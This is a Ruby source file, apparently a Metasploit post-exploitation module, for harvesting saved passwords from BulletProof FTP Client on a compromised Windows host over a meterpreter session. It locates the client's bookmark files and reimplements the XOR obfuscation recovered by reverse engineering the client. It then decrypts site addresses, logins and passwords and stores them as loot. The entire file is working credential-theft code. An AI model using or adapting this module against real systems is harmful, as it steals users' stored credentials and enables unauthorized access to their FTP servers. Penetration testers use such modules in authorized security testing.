##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'msf/core/auxiliary/report'

class Metasploit3 < Msf::Post

  include Msf::Auxiliary::Report
  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::Windows::Registry

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Windows Gather BulletProof FTP Client Saved Password Extraction',
      'Description'   => %q{
          This module extracts information from BulletProof FTP Bookmarks files and store
        retrieved credentials in the database.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'juan vazquez'],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))
  end

  class BookmarksParser

    # Array of entries found after parsing a Bookmarks File
    attr_accessor :entries

    def initialize(contents)
      @xor_key = nil
      @contents_bookmark = contents
      @entries = []
    end

    def parse_bookmarks
      if not parse_header
        return
      end

      while @contents_bookmark.length > 0
        parse_entry
        @contents_bookmark.slice!(0, 25) # 25 null bytes between entries
      end
    end

    private

    def low_dword(value)
      return Rex::Text.pack_int64le(value).unpack("VV")[0]
    end

    def high_dword(value)
      return Rex::Text.pack_int64le(value).unpack("VV")[1]
    end

    def low_byte(value)
      return [value].pack("V").unpack("C*")[0]
    end

    def generate_xor_key
      # Magic numbers 0x100 and 0x8088405 is obtained from bpftpclient.exe static analysis:
      #.text:007B13C1                 mov     eax, 100h
      # ... later
      #.text:0040381F                 imul    edx, dword_7EF008[ebx], 8088405h
      #.text:00403829                 inc     edx
      #.text:0040382A                 mov     dword_7EF008[ebx], edx
      #.text:00403830                 mul     edx
      temp = @xor_key * 0x8088405
      temp = low_dword(temp)
      temp = temp + 1
      @xor_key = temp
      result = temp * 0x100
      result = high_dword(result)
      result = low_byte(result)
      return result
    end

    def decrypt(encrypted)
      length = encrypted.unpack("C")[0]
      return "" if length.nil?
      @xor_key = length
      encrypted = encrypted[1..length]
      return "" if encrypted.length != length
      decrypted = ""
      encrypted.unpack("C*").each { |byte|
        key = generate_xor_key
        decrypted << [byte ^ key].pack("C")
      }
      return decrypted
    end

    def parse_object
      object_length = @contents_bookmark[0,1].unpack("C")[0]
      object = @contents_bookmark[0, object_length + 1 ]
      @contents_bookmark.slice!(0, object_length+1)
      content = decrypt(object)
      return content
    end

    def parse_entry
      site_name = parse_object
      site_address = parse_object
      login = parse_object
      remote_dir = parse_object
      local_dir = parse_object
      port = parse_object
      password = parse_object

      @entries << {
        :site_name => site_name,
        :site_address => site_address,
        :login => login,
        :remote_dir => remote_dir,
        :local_dir => local_dir,
        :port => port,
        :password => password
      }
    end

    def parse_header
      signature = parse_object
      if not signature.eql?("BPSitelist")
        return false # Error!
      end

      unknown = @contents_bookmark.slice!(0, 4) # "\x01\x00\x00\x00"
      return false unless unknown == "\x01\x00\x00\x00"

      return true
    end
  end

  def check_installation
    bullet_reg = "HKCU\\SOFTWARE\\BulletProof Software"
    bullet_reg_ver = registry_enumkeys("#{bullet_reg}")

    return false if bullet_reg_ver.nil?

    bullet_reg_ver.each { |key|
      if key =~ /BulletProof FTP Client/
        return true
      end
    }
    return false
  end

  def get_bookmarks(path)

    bookmarks = []

    if not directory?(path)
      return bookmarks
    end

    session.fs.dir.foreach(path) do |entry|
      if directory?("#{path}\\#{entry}") and entry != "." and entry != ".."
        bookmarks.concat(get_bookmarks("#{path}\\#{entry}"))
      elsif entry =~ /bpftp.dat/ and file?("#{path}\\#{entry}")
        vprint_good("BulletProof FTP Bookmark file found at #{path}\\#{entry}")
        bookmarks << "#{path}\\#{entry}"
      end
    end
    return bookmarks
  end

  def check_bulletproof(user_dir)
    session.fs.dir.foreach(user_dir) do |dir|
      if dir =~ /BulletProof Software/
        vprint_status("BulletProof Data Directory found at #{user_dir}\\#{dir}")
        return "#{user_dir}\\#{dir}"#"\\BulletProof FTP Client\\2010\\sites\\Bookmarks"
      end
    end
    return nil
  end

  def report_findings(entries)

    if session.db_record
      source_id = session.db_record.id
    else
      source_id = nil
    end

    entries.each{ |entry|
      @credentials << [
        entry[:site_name],
        entry[:site_address],
        entry[:port],
        entry[:login],
        entry[:password],
        entry[:remote_dir],
        entry[:local_dir]
      ]

      report_auth_info(
        :host  => entry[:site_address],
        :port => entry[:port],
        :proto => 'tcp',
        :sname => 'ftp',
        :user => entry[:login],
        :pass => entry[:password],
        :ptype => 'password',
        :source_id => source_id,
        :source_type => "exploit"
      )
    }
  end

  def run

    print_status("Checking if BulletProof FTP Client is installed...")
    if not check_installation
      print_error("BulletProof FTP Client isn't installed")
      return
    end

    print_status("Searching BulletProof FTP Client Data directories...")
    # BulletProof FTP Client 2010 uses User Local Settings to store bookmarks files
    profiles = grab_user_profiles()
    bullet_paths = []
    profiles.each do |user|
      next if user['LocalAppData'] == nil
      bulletproof_dir = check_bulletproof(user['LocalAppData'])
      bullet_paths << bulletproof_dir if bulletproof_dir
    end

    print_status("Searching BulletProof FTP Client installation directory...")
    # BulletProof FTP Client 2.6 uses the installation dir to store bookmarks files
    program_files_x86 = expand_path('%ProgramFiles(X86)%')
    if not program_files_x86.empty? and program_files_x86 !~ /%ProgramFiles\(X86\)%/
      program_files = program_files_x86 #x64
    else
      program_files = expand_path('%ProgramFiles%') #x86
    end
    session.fs.dir.foreach(program_files) do |dir|
      if dir =~ /BulletProof FTP Client/
        vprint_status("BulletProof Installation directory found at #{program_files}\\#{dir}")
        bullet_paths << "#{program_files}\\#{dir}"
      end
    end

    if bullet_paths.empty?
      print_error("BulletProof FTP Client directories not found.")
      return
    end

    print_status("Searching for BulletProof FTP Client Bookmarks files...")
    bookmarks = []
    bullet_paths.each { |path|
      bookmarks.concat(get_bookmarks(path))
    }
    if bookmarks.empty?
      print_error("BulletProof FTP Client Bookmarks files not found.")
      return
    end

    print_status("Searching for connections data on BulletProof FTP Client Bookmarks files...")
    entries = []
    bookmarks.each { |bookmark|
      p = BookmarksParser.new(read_file(bookmark))
      p.parse_bookmarks
      if p.entries.length > 0
        entries.concat(p.entries)
      else
        vprint_error("Entries not found on #{bookmark}")
      end
    }

    if entries.empty?
      print_error("BulletProof FTP Client Bookmarks not found.")
      return
    end

    # Report / Show findings
    @credentials = Rex::Ui::Text::Table.new(
      'Header'    => "BulletProof FTP Client Bookmarks",
      'Indent'    => 1,
      'Columns'   =>
        [
          "Site Name",
          "Site Address",
          "Port",
          "Login",
          "Password",
          "Remote Dir",
          "Local Dir"
        ])

    report_findings(entries)
    results = @credentials.to_s

    print_line("\n" + results + "\n")

    if not @credentials.rows.empty?
      p = store_loot(
        'bulletproof.creds',
        'text/plain',
        session,
        @credentials.to_csv,
        'bulletproof.creds.csv',
        'BulletProof Credentials'
      )
      print_status("Data stored in: #{p.to_s}")
    end

  end

end
